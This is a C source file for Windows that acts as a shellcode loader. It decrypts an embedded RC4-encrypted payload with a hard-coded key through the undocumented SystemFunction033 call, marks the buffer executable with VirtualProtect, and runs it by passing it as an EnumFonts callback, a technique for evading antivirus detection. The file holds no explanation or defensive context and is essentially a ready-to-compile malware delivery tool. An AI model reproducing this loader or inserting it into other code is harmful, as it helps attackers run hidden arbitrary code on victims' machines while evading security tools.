#include <windows.h>


typedef NTSTATUS(WINAPI* _SystemFunction033)(
    struct ustring* memoryRegion,
    struct ustring* keyPointer);

struct ustring {
    DWORD Length;
    DWORD MaximumLength;
    PUCHAR Buffer;
} _data, key;

int main() {
    _SystemFunction033 SystemFunction033 = (_SystemFunction033)GetProcAddress(LoadLibrary(L"advapi32"), "SystemFunction033");

    unsigned char RC4Key[] = {
        0x84, 0xCE, 0xBA, 0x09, 0x94, 0x80, 0x46, 0xC6, 0x82, 0x86, 0x02, 0x68, 0x56, 0x1C, 0x4B, 0xAD,
        0x64, 0x93, 0x3C, 0x14, 0xC4, 0xF7, 0xC4, 0x9D, 0x03, 0xF0, 0xFC, 0xD0, 0x18, 0xE6, 0xB8, 0x00 };


    unsigned char RC4shellcode[] = {
            0xB8, 0x98, 0xD8, 0xFE, 0x21, 0x19, 0x71, 0xFF, 0xA1, 0x78, 0x02, 0xFC, 0x90, 0x70, 0x4A, 0xB3,
            0x49, 0x76, 0xA0, 0xC4, 0x52, 0xBC, 0x1C, 0x9F, 0xC3, 0xE8, 0x05, 0x27, 0x3B, 0x71, 0x8B, 0x41,
            0xF1, 0x65, 0xA1, 0xBE, 0x11, 0xE8, 0x2F, 0x7F, 0x0F, 0x19, 0x59, 0x40, 0x5E, 0x82, 0xD2, 0x98,
            0x17, 0x1A, 0x44, 0x25, 0x20, 0x68, 0x13, 0xD4, 0x18, 0x01, 0x65, 0xF9, 0x93, 0xDF, 0x3D, 0x34,
            0x49, 0xDF, 0xCE, 0x78, 0xE5, 0xE3, 0x90, 0xB5, 0x6D, 0x45, 0xB0, 0x0D, 0x9E, 0x71, 0x8B, 0x09,
            0x3F, 0x21, 0x56, 0xF0, 0x39, 0x71, 0x06, 0xB4, 0x74, 0x3D, 0x45, 0xC4, 0x77, 0xBD, 0x35, 0x5D,
            0xD8, 0x63, 0xB7, 0x31, 0x98, 0xC0, 0x48, 0x8F, 0x4A, 0x00, 0x18, 0x2B, 0x4E, 0x8B, 0x53, 0x37,
            0xA0, 0x97, 0x0E, 0x58, 0xDC, 0x06, 0x82, 0xCB, 0x2F, 0x9F, 0x30, 0x09, 0xE2, 0x5D, 0xC7, 0x25,
            0x4C, 0xF7, 0x3A, 0x35, 0xA4, 0x16, 0x4E, 0xFE, 0x3B, 0xD2, 0x64, 0x6A, 0xEA, 0x9E, 0xBA, 0xF4,
            0x21, 0xEC, 0xDD, 0x9F, 0xC4, 0x45, 0xDF, 0x5F, 0x28, 0xCD, 0x0E, 0x9B, 0x26, 0x71, 0xE1, 0xCD,
            0x58, 0x74, 0x6B, 0xAF, 0xAE, 0xD4, 0xD6, 0xA9, 0xA3, 0x0C, 0xC5, 0x04, 0x3D, 0x86, 0x84, 0x18,
            0x8F, 0x97, 0x76, 0xB9, 0xA8, 0xF3, 0x2F, 0x54, 0xFA, 0xAE, 0x98, 0x4D, 0xE0, 0x3C, 0x93, 0xBE,
            0xDB, 0x0B, 0x28, 0x7C, 0x1C, 0xDD, 0x7E, 0xC7, 0xA7, 0x50, 0x40, 0xC5, 0x8A, 0xBD, 0xD4, 0x44,
            0xA5, 0x87, 0xCF, 0xC8, 0x38, 0xF9, 0x4F, 0x45, 0x58, 0x7C, 0xBE, 0x77, 0x14, 0xDA, 0x3A, 0x58,
            0xAA, 0xE2, 0xE5, 0xE5, 0xF9, 0xE4, 0x49, 0x95, 0x05, 0x74, 0x1C, 0xB2, 0xDC, 0x89, 0x41, 0xDD,
            0x01, 0x76, 0xEE, 0x5D, 0x27, 0x74, 0xE6, 0xA5, 0x60, 0x9D, 0xEC, 0xE8, 0x59, 0x7A, 0x9E, 0xAA,
            0x82, 0x0D, 0x6B, 0x91, 0x08, 0xAD, 0xDD, 0xB7, 0xFE, 0xD8, 0x64, 0x25, 0xEC, 0xED, 0x7C, 0x25,
            0x5B, 0x78, 0xAB, 0xB8 };

    key.Buffer = (PUCHAR)(&RC4Key);
    key.Length = sizeof(RC4Key);

    _data.Buffer = (PUCHAR)RC4shellcode;
    _data.Length = sizeof RC4shellcode;

    SystemFunction033(&_data, &key);

    DWORD oldProtect = 0;
    BOOL ret = VirtualProtect(RC4shellcode, sizeof RC4shellcode, PAGE_EXECUTE_READWRITE, &oldProtect);
    //((void(*)()) & shellcode)();
    EnumFonts(GetDC(0), (LPCWSTR)0, (FONTENUMPROC)(char*)RC4shellcode, 0);
}
